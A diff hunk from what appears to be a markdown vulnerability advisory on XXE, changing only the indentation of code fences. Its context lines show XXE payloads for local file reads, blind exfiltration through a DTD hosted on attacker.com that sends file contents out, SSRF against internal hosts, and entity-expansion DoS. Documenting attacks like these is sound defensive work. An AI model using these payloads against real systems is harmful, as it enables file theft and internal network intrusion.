@@ -200,26 +200,26 @@ The vulnerability allows for several types of XXE attacks:
    ```xml
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///path/to/sensitive/file"> ]>
    
-```
+   ```
 
 2. **Blind XXE with Data Exfiltration**:
    ```xml
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd"> %xxe;]>
    
-```
+   ```
    Where malicious.dtd contains:
    ```xml
    <!ENTITY % data SYSTEM "file:///path/to/sensitive/file">
    <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%data;'>">
    %param1;
    
-```
+   ```
 
 3. **XXE for SSRF**:
    ```xml
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-host:port/api"> ]>
    
-```
+   ```
 
 4. **Entity Expansion DoS**:
    Nested entity references causing exponential expansion and resource exhaustion.
